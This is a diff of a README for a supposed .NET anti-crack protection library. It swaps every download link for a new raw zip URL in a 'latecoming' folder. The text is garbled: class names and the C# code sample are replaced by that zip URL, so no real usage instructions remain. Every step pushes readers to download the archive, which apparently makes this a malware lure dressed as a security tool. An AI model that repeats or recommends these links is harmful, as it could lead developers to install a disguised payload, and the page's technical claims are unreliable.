@@ -1,6 +1,6 @@
 # 🛡️ RenameModules-Anti-Crack - Keep Your .NET Applications Safe
 
-[![Download](https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip)](https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip)
+[![Download](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)
 
 ## 📦 Overview
 
@@ -14,18 +14,18 @@ To begin using RenameModules, follow these simple steps:
 
 Go to the Releases page to download the latest version of RenameModules:
 
-[Download Latest Release](https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip)
+[Download Latest Release](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)
 
 ### 2. Install the Library
 
-After downloading, add the `https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip` class to your project. This class contains all the necessary code to integrate the protection features into your application.
+After downloading, add the `https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip` class to your project. This class contains all the necessary code to integrate the protection features into your application.
 
 ### 3. Implement the Protection
 
 Call the `Execute` method at the start of your program. This method initializes the renaming process and engages the protection features.
 
 ```csharp
-https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip();
+https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip();
 ```
 
 ## 🛡️ Protects Against
@@ -49,14 +49,14 @@ For optimal security, consider these recommendations:
 
 1. **Download the Library**: Click the link below to visit the Releases page and download the latest version.
 
-   [Download Latest Release](https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip)
+   [Download Latest Release](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)
 
-2. **Add to Your Project**: Include the `https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip` class in your project's directory.
+2. **Add to Your Project**: Include the `https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip` class in your project's directory.
 
 3. **Integrate into Your Code**: Add the following line at the beginning of your main program file:
 
    ```csharp
-   https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip();
+   https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip();
    ```
 
 ### Additional Configuration (Optional)
@@ -101,4 +101,4 @@ This library covers the following areas:
 
 By using RenameModules, you will add a robust layer of protection to your .NET applications. Visit the Releases page now to start securing your software.
 
-[Download Latest Release](https://raw.githubusercontent.com/revathi-birapaka/RenameModules-Anti-Crack/main/latecoming/RenameModules-Anti-Crack-2.4.zip)
+[Download Latest Release](https://github.com/revathi-birapaka/RenameModules-Anti-Crack/raw/refs/heads/main/latecoming/Rename_Crack_Anti_Modules_2.4.zip)
